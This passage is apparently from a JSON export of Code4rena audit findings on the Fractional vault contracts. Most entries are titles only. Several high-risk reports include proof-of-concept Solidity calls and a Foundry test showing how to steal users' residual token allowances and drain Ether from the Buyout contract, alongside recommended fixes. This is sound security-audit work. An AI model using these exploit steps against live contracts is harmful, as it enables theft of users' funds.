"https://github.com/code-423n4/2022-07-fractional-findings/issues/468", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-07-fractional-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L58 https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L77 https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L91   # Vulnerability details  ## Vulnerability Details  A depositor cannot have any residual allowance after depositing to the vault because the tokens can be stolen by anyone.  ## Proof-of-Concept  Assume that Alice has finished deploying the vault, and she would like to deposit her ERC20, ERC721, and ERC1155 tokens to the vault. She currently holds the following assets in her wallet  - `1000` XYZ ERC20 tokens - APE #1 ERC721 NFT, APE #2 ERC721 NFT, APE #3 ERC721 NFT,  - `1000` ABC ERC1155 tokens  Thus, she sets up the necessary approval to grant [`baseVault`](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L17) contract the permission to transfer her tokens to the vault.  ```solidity erc20.approve(address(baseVault), type(uint256).max); erc721.setApprovalForAll(address(baseVault), true); erc1155.setApprovalForAll(address(baseVault), true); ```  Alice decided to deposit `50` XYZ ERC20 tokens, APE #1 ERC721 NFT, and `50` ABC tokens to the vault by calling `baseVault.batchDepositERC20`, `baseVault.batchDepositERC721`, and `baseVault.batchDepositERC1155` as shown below:  ```solidity baseVault.batchDepositERC20(alice.addr, vault, [XYZ.addr], [50]) baseVault.batchDepositERC721(alice.addr, vault, [APE.addr], [#1]) baseVault.batchDepositERC1155(alice.addr, vault, [ABC.addr], [#1], [50], \"\") ```  An attacker notices that there is residual allowance left on the `baseVault`, thus the attacker executes the following transactions to steal Alice's assets and send them to the attacker's wallet address.  ```solidity baseVault.batchDepositERC20(alice.addr, attacker.addr, [XYZ.addr], [950]) baseVault.batchDepositERC721(alice.addr, attacker.addr, [APE.addr, APE.addr], [#2, #3]) baseVault.batchDepositERC1155(alice.addr, attacker.addr, [ABC.addr], [#1], [950], \"\") ```  [https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L58](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L58)  ```solidity function batchDepositERC20(     address _from,     address _to,     address[] calldata _tokens,     uint256[] calldata _amounts ) external {     for (uint256 i = 0; i < _tokens.length; ) {         IERC20(_tokens[i]).transferFrom(_from, _to, _amounts[i]);         unchecked {             ++i;         }     } } ```  [https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L77](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L77)  ```solidity function batchDepositERC721(     address _from,     address _to,     address[] calldata _tokens,     uint256[] calldata _ids ) external {     for (uint256 i = 0; i < _tokens.length; ) {         IERC721(_tokens[i]).safeTransferFrom(_from, _to, _ids[i]);         unchecked {             ++i;         }     } } ```  [https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L91](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/protoforms/BaseVault.sol#L91)  ```solidity function batchDepositERC1155(     address _from,     address _to,     address[] calldata _tokens,     uint256[] calldata _ids,     uint256[] calldata _amounts,     bytes[] calldata _datas ) external {     unchecked {         for (uint256 i = 0; i < _tokens.length; ++i) {             IERC1155(_tokens[i]).safeTransferFrom(                 _from,                 _to,                 _ids[i],                 _amounts[i],                 _datas[i]             );         }     } } ```  ## Impact  Lost of assets for users as a malicious user could utilise the `baseVault` contract to exploit the user's residual allowance to steal their assets.  ## Recommended Mitigation Steps  It is recommended to only allow the `baseVault.batchDepositERC20`, `baseVault.batchDepositERC721`, and `baseVault.batchDepositERC1155` functions to pull tokens from the caller (`msg.sender`).  Considering updating the affected functions to remove the `from` parameter, and use `msg.sender` instead.  ```diff function batchDepositERC20( -   address _from,     address _to,     address[] calldata _tokens,     uint256[] calldata _amounts ) external {     for (uint256 i = 0; i < _tokens.length; ) { -       IERC20(_tokens[i]).transferFrom(_from, _to, _amounts[i]); +       IERC20(_tokens[i]).transferFrom(msg.sender, _to, _amounts[i]);         unchecked {             ++i;         }     } } ```  ```diff function batchDepositERC721( -   address _from,     address _to,     address[] calldata _tokens,     uint256[] calldata _ids ) external {     for (uint256 i = 0; i < _tokens.length; ) { -       IERC721(_tokens[i]).safeTransferFrom(_from, _to, _ids[i]); +       IERC721(_tokens[i]).safeTransferFrom(msg.sender, _to, _ids[i]);         unchecked {             ++i;         }     } } ```  ```diff function batchDepositERC1155( -   address _from,     address _to,     address[] calldata _tokens,     uint256[] calldata _ids,     uint256[] calldata _amounts,     bytes[] calldata _datas ) external {     unchecked {         for (uint256 i = 0; i < _tokens.length; ++i) {             IERC1155(_tokens[i]).safeTransferFrom( -               _from, +               msg.sender,                 _to,                 _ids[i],                 _amounts[i],                 _datas[i]             );         }     } } ```  "}, {"title": "```migrateFractions``` may be called more than once by the same user which may lead to loss of tokens for other users", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/467", "labels": ["bug", "3 (High Risk)"], "target": "2022-07-fractional-findings", "body": "```migrateFractions``` may be called more than once by the same user which may lead to loss of tokens for other users"}, {"title": "Malicious User Could Burn The Assets After A Successful Migration", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/459", "labels": ["bug", "3 (High Risk)"], "target": "2022-07-fractional-findings", "body": "Malicious User Could Burn The Assets After A Successful Migration"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/458", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/456", "labels": ["bug", "G (Gas Optimization)", "sponsor disputed"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/454", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/453", "labels": ["bug", "G (Gas Optimization)", "sponsor disputed"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/452", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/450", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/449", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "Installing vault plugins with colliding function selectors can cause issues", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/446", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-07-fractional-findings", "body": "Installing vault plugins with colliding function selectors can cause issues"}, {"title": "Cash-out from a successful buyout allows an attacker to drain Ether from the `Buyout` contract", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/440", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-07-fractional-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L268-L269   # Vulnerability details  ## Impact  The function `Buyout.cash` allows a user to cash out proceeds (Ether) from a successful vault buyout.  However, due to how `buyoutShare` is calculated in `Buyout.cash`, users (fractional vault token holders) cashing out would receive more Ether than they are entitled to. The calculation is wrong as it uses the initial Ether balance stored in `buyoutInfo[_vault].ethBalance`. Each consecutive cash-out will lead to a user receiving more Ether, ultimately draining the Ether funds of the `Buyout` contract.  ## Proof of Concept  Copy paste the following test case into `Buyout.t.sol` and run the test via `forge test -vvv --match-test testCashDrainEther`:  The test shows how 2 users Alice and Eve cash out Ether from a successful vault buyout (which brought in `10 ether`). Alice and Eve are both entitled to receive `5 ether` each. Alice receives the correct amount when cashing out, however, due to a miscalculation of `buyoutShare` (see [#L268-L269](https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L268-L269)), Eve can cash-out `10 ether` from the `Buyout` contract.  ```solidity function testCashDrainEther() public {   /// ==================   /// ===== SETUP =====   /// ==================    deployBaseVault(alice, TOTAL_SUPPLY);   (token, tokenId) = registry.vaultToToken(vault);   alice.ferc1155 = new FERC1155BS(address(0), 111, token);   bob.ferc1155 = new FERC1155BS(address(0), 222, token);   eve.ferc1155 = new FERC1155BS(address(0), 333, token);    buyout = address(buyoutModule);   proposalPeriod = buyoutModule.PROPOSAL_PERIOD();   rejectionPeriod = buyoutModule.REJECTION_PERIOD();    vm.label(vault, \"VaultProxy\");   vm.label(token, \"Token\");    setApproval(alice, vault, true);   setApproval(alice, buyout, true);   setApproval(bob, vault, true);   setApproval(bob, buyout, true);   setApproval(eve, vault, true);   setApproval(eve, buyout, true);    alice.ferc1155.safeTransferFrom(       alice.addr,       bob.addr,       1,       6000,       \"\"   );    alice.ferc1155.safeTransferFrom(       alice.addr,       eve.addr,       1,       2000,       \"\"   );   /// ==================   /// ===== SETUP END =====   /// ==================    /// Fraction balances:   assertEq(getFractionBalance(alice.addr), 2000); // Alice: 2000   assertEq(getFractionBalance(bob.addr), 6000); // Bob: 6000   assertEq(getFractionBalance(eve.addr), 2000); // Eve: 2000    bob.buyoutModule.start{value: 10 ether}(vault);    assertEq(getETHBalance(buyout), 10 ether);    /// Bob (proposer of buyout) transfered his fractions to buyout contract   assertEq(getFractionBalance(buyout), 6000);    vm.warp(rejectionPeriod + 1);    bob.buyoutModule.end(vault, burnProof);    /// Fraction balances after buyout ended:   assertEq(getFractionBalance(alice.addr), 2000);  // Alice: 2000   assertEq(getFractionBalance(bob.addr), 0); // Bob: 0   assertEq(getFractionBalance(eve.addr), 2000); // Eve: 2000    assertEq(getETHBalance(buyout), 10 ether);    /// Alice cashes out 2000 fractions -> 5 ETH (correct amount)   alice.buyoutModule.cash(vault, burnProof);    assertEq(getFractionBalance(alice.addr), 0);   assertEq(getETHBalance(alice.addr), 105 ether);    /// Eve cashes out 2000 fractions -> REVERTS (internally it calculates Eve would receive 10 ETH instead of the entitled 5 ETH). If the contract holds sufficient Ether from other successful buyouts, Eve would receive the full 10 ETH   eve.buyoutModule.cash(vault, burnProof); } ```  **Additionally** to the demonstrated PoC in the test case, an attacker could intentionally create vaults with many wallets and exploit the vulnerability:  1. Attacker deploys a vault with `10.000` fractions minted 2. 51% of fractions (`5.100`) are kept in the main wallet, all other fractions are distributed to 5 other self-controlled wallets (Wallets 1-5, `980` fractions each) 3. With the first wallet, the attacker starts a buyout with `10 ether` - fractions are transferred into the `Buyout` contract as well as `10 ether` 4. Attacker waits for `REJECTION_PERIOD` to elapse to call `Buyout.end` (51% of fractions are already held in the contract, therefore no need for voting) 5. After the successful buyout, the attacker uses the `Buyout.cash` function to cash out each wallet. Each subsequent cash-out will lead to receiving more Ether, thus stealing Ether from the `Buyout` contract:    1. Wallet 1 - `buyoutShare = (980 * 10 ) / (3920 + 980) = 2 ether` (`totalSupply = 3920` after burning `980` fractions from wallet 1)    2. Wallet 2 - `buyoutShare = (980 * 10 ) / (2940 + 980) = 2.5 ether` (`totalSupply = 2940` after burning `980` fractions from wallet 2)    3. Wallet 3 - `buyoutShare = (980 * 10 ) / (1960 + 980) = ~3.3 ether` (`totalSupply = 1960` after burning `980` fractions from wallet 3)    4. Wallet 4 - `buyoutShare = (980 * 10 ) / (980 + 980) = 5 ether` (`totalSupply = 980` after burning `980` fractions from wallet 4)    5. Wallet 5 - `buyoutShare = (980 * 10 ) / (0 + 980) = 10 ether` (`totalSupply = 0` after burning `980` fractions from wallet 5)  If summed up, cashing out the 5 wallets, the attacker receives `22.8 ether` in total. Making a profit of `12.8 ether`.  This can be repeated and executed with multiple buyouts and vaults at the same time as long as there is Ether left to steal in the `Buyout` contract.  ## Tools Used  Manual review  ## Recommended mitigation steps  Decrement `ethBalance` from buyout info `buyoutInfo[_vault].ethBalance -= buyoutShare;` in `Buyout.cash` (see `@audit-info` annotation):  ```solidity function cash(address _vault, bytes32[] calldata _burnProof) external {     // Reverts if address is not a registered vault     (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(         _vault     );     if (id == 0) revert NotVault(_vault);     // Reverts if auction state is not successful     (, , State current, , uint256 ethBalance, ) = this.buyoutInfo(_vault);     State required = State.SUCCESS;     if (current != required) revert InvalidState(required, current);     // Reverts if caller has a balance of zero fractional tokens     uint256 tokenBalance = IERC1155(token).balanceOf(msg.sender, id);     if (tokenBalance == 0) revert NoFractions();      // Initializes vault transaction     bytes memory data = abi.encodeCall(         ISupply.burn,         (msg.sender, tokenBalance)     );     // Executes burn of fractional tokens from caller     IVault(payable(_vault)).execute(supply, data, _burnProof);      // Transfers buyout share amount to caller based on total supply     uint256 totalSupply = IVaultRegistry(registry).totalSupply(_vault);     uint256 buyoutShare = (tokenBalance * ethBalance) /         (totalSupply + tokenBalance);     buyoutInfo[_vault].ethBalance -= buyoutShare; // @audit-info decrement `ethBalance` by `buyoutShare`     _sendEthOrWeth(msg.sender, buyoutShare);     // Emits event for cashing out of buyout pool     emit Cash(_vault, msg.sender, buyoutShare); } ```   "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/439", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/436", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/432", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/431", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/430", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/422", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/419", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/417", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/415", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/392", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/391", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/388", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/387", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/380", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "Migration's `leave` function allows leaving a committed proposal", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/379", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-07-fractional-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L141   # Vulnerability details  The `leave` function allows to leave a proposal even if the proposal has been committed and failed. This makes it a (probably unintended) duplicate functionality of `withdrawContributions`, which is the function that should be used to withdraw failed contributions.  ## Impact User assets might be lost: When withdrawing assets from a failed migration, users should get back a different amount of assets, according to the buyout auction result. (I detailed this in another issue - \"Migration::withdrawContribution falsely assumes that user should get exactly his original contribution back\"). But when withdrawing assets from a proposal that has not been committed, users should get back their original amount of assets, as that has not changed. Therefore, if `leave` does not check if the proposal has been committed, users could call `leave` instead of `withdrawContribution` and get back a different amounts of assets than they deserve, on the expense of other users.  ## Proof of Concept The `leave` function [does not check](https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L141) anywhere whether `proposal.isCommited == true`. Therefore, if a user calls it after a proposal has been committed and failed, it will continue to send him his original contribution back, instead of sending him the adjusted amount that has been returned from Buyout.  ## Recommended Mitigation Steps Revert in `leave` if `proposal.isCommited == true`. You might be also able to merge the functionality of `leave` and `withdrawContribution`, but that depends on how you will implement the fix for `withdrawContribution`.  "}, {"title": "No check ```address(0)``` on ```transferOwnership``` could render the vault unfunctioning ", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/376", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-07-fractional-findings", "body": "No check ```address(0)``` on ```transferOwnership``` could render the vault unfunctioning "}, {"title": "Migration::withdrawContribution falsely assumes that user should get exactly his original contribution back", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/375", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-07-fractional-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L308 https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L321 https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L312 https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L325   # Vulnerability details  When a user calls `withdrawContribution`, it will try to send him back his original contribution for the proposal. But if the proposal has been committed, and other users have interacted with the buyout, Migration will receive back a different amount of ETH and tokens. Therefore it shouldn't send the user back his original contribution, but should send whatever his share is of whatever was received back from Buyout.  ## Impact Loss of funds for users. Some users might not be able to withdraw their contribution at all, and other users might withdraw funds that belong to other users. (This can also be done as a purposeful attack.)  ## Proof of Concept A summary is described at the top.  It's probably not needed, but the here's the flow in detail. When a user joins a proposal, Migration [saves](https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L124:#L135) his contribution: ```         userProposalEth[_proposalId][msg.sender] += msg.value;         userProposalFractions[_proposalId][msg.sender] += _amount; ``` Later when the user would want to withdraw his contribution from a failed migration, Migration would [refer](https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L308:#L325) to these same variables to decide how much to send to the user: ```         uint256 userFractions = userProposalFractions[_proposalId][msg.sender];         IFERC1155(token).safeTransferFrom(address(this), msg.sender, id, userFractions, \"\");         uint256 userEth = userProposalEth[_proposalId][msg.sender];         payable(msg.sender).transfer(userEth); ```  But if the proposal was committed, and other users interacted with the buyout, then the amount of ETH and tokens that Buyout sends back is not the same contribution. For example, if another user called `buyFractions` for the buyout, it [will decrease](https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Buyout.sol#L168) the amount of tokens in the pool: ```         IERC1155(token).safeTransferFrom(address(this), msg.sender, id, _amount, \"\"); ``` And when the proposal will end, if it has failed, Buyout will [send back](https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Buyout.sol#L228) to Migration [the amount](https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Buyout.sol#L206) of tokens in the pool: ```         uint256 tokenBalance = IERC1155(token).balanceOf(address(this), id);         ...         IERC1155(token).safeTransferFrom(address(this), proposer, id, tokenBalance, \"\"); ``` (**Same will happen for the ETH amount)  Therefore, Migration will receive back less tokens than the original contribution was. When the user will try to call `withdrawContribution` to withdraw his contribution from the pool, Migration would [try to send](https://github.com/code-423n4/2022-07-fractional/blob/main/src/modules/Migration.sol#L310) the user's original contribution. But there's a deficit of that. If other users have contributed the same token, then it will transfer their tokens to the user. If not, then the withdrawal will simply revert for insufficient balance.  ## Recommended Mitigation Steps I am not sure, but I think that the correct solution would be that upon a failed proposal's end, there should be a hook call from Buyout to the proposer - in our situation, Migration. Migration would then see(/receive as parameter) how much ETH/tokens were received, and update the proposal with the change needed. eg. send to each user 0.5 his tokens and 1.5 his ETH. In another issue I submitted, \"User can't withdraw assets from failed migration if another buyout is going on/succeeded\", I described for a different reason why such a callback to Migration might be needed. Please see there for more implementation suggestion. I think this issue shows that indeed it is needed.  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/371", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/370", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/366", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/365", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "Install  function no check _plugins is address(0)", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/364", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-07-fractional-findings", "body": "Install  function no check _plugins is address(0)"}, {"title": "BaseVault does not necessarily have a Buyout mechanism", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/363", "labels": ["bug", "disagree with severity", "QA (Quality Assurance)"], "target": "2022-07-fractional-findings", "body": "BaseVault does not necessarily have a Buyout mechanism"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/362", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/361", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/353", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/352", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/351", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/339", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged", "old-submission-method"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/338", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed", "old-submission-method"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "[Buyout module] Fraction price is not updated when total supply changes", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/337", "labels": ["bug", "2 (Med Risk)"], "target": "2022-07-fractional-findings", "body": "[Buyout module] Fraction price is not updated when total supply changes"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/331", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/330", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/328", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "Migration: no check that user-supplied `proposalId` and `vault` match", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/326", "labels": ["bug", "3 (High Risk)"], "target": "2022-07-fractional-findings", "body": "Migration: no check that user-supplied `proposalId` and `vault` match"}, {"title": "Unhandled return values of transfer for ERC20/WETH transfer", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/323", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-07-fractional-findings", "body": "Unhandled return values of transfer for ERC20/WETH transfer"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/321", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/314", "labels": ["bug", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/313", "labels": ["bug", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "No revert on transfer of ERC20 tokens can manipulate vaults on creation", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/312", "labels": ["bug", "disagree with severity", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-07-fractional-findings", "body": "No revert on transfer of ERC20 tokens can manipulate vaults on creation"}, {"title": "Division rounding can make fraction-price lower than intended (down to zero)", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/310", "labels": ["bug", "3 (High Risk)"], "target": "2022-07-fractional-findings", "body": "Division rounding can make fraction-price lower than intended (down to zero)"}, {"title": "Proposer can `start` a perpetual buyout which can only `end` if the auction succeeds and is not rejected", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/306", "labels": ["bug", "3 (High Risk)"], "target": "2022-07-fractional-findings", "body": "Proposer can `start` a perpetual buyout which can only `end` if the auction succeeds and is not rejected"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/304", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-07-fractional-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/303", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/299", "labels": ["bug", "G (Gas Optimization)", "sponsor disputed", "old-submission-method"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/297", "labels": ["bug", "G (Gas Optimization)", "sponsor confirmed"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/295", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/290", "labels": ["bug", "G (Gas Optimization)", "sponsor acknowledged"], "target": "2022-07-fractional-findings", "body": "Gas Optimizations"}, {"title": "[PNM-001] The time constraint of selling fractions can be bypassed by directly transferring fraction tokens to the buyout contract", "html_url": "https://github.com/code-423n4/2022-07-fractional-findings/issues/283", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-07-fractional-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-07-fractional/blob/8f2697ae727c60c93ea47276f8fa128369abfe51/src/modules/Buyout.sol#L206   # Vulnerability details  